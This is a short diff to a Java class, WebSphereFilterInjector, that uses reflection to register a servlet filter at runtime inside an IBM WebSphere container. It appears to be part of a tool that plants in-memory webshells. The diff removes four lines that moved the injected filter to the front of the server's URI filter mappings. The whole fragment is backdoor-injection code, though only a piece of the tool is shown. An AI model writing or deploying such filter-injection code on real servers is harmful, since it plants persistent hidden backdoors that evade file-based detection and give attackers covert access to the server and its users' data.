@@ -139,10 +139,6 @@ public class WebSphereFilterInjector {
             setFieldValue(filterConfig, "dispatchMode", new int[]{0});
             setFieldValue(filterConfig, "name", getClassName());
             invokeMethod(context, "addMappingFilter", new Class[]{String.class, iFilterConfigClass}, new Object[]{getUrlPattern(), filterConfig});
-            List<Object> uriFilterMappings = (ArrayList<Object>) getFieldValue(filterManager, "uriFilterMappings");
-            int lastIndex = uriFilterMappings.size() - 1;
-            Object lastElement = uriFilterMappings.remove(lastIndex);
-            uriFilterMappings.add(0, lastElement);
             invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{getClassName()});
         }
         // 清除缓存
